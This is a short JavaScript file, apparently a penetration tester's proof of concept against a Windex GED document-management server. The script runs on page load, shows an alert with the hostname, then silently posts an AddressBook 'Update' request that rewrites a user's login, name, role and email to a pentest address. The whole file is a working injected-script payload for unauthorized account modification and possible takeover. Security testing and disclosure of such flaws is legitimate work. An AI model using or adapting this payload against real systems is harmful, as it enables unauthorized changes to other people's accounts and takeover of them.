function sendPostRequest() {
    var hostname = window.location.hostname
    alert(hostname)
    var url = 'http://'+hostname+'/windex-ged/WindexServer';
    var data = {
        Agent: "AddressBook",
        Order: "Update",
        IdUser: "58896",
        IdRightTemplate: "0",
        Login: "1234567A",
        Civility: "",
        Lastname: "T1",
        Firstname: "T1",
        Service: "Gestionnaire",
        Email: "pentest1@algosecure.fr",
        IdLanguage: "FR",
        UserType: "",
        DossierFilter: ""
    };

    fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: new URLSearchParams(data)
    })
    .then(response => response.text())
    .then(data => console.log('Success:', data))
    .catch(error => console.error('Error:', error));
}

// Call the function when the script is loaded
window.onload = sendPostRequest
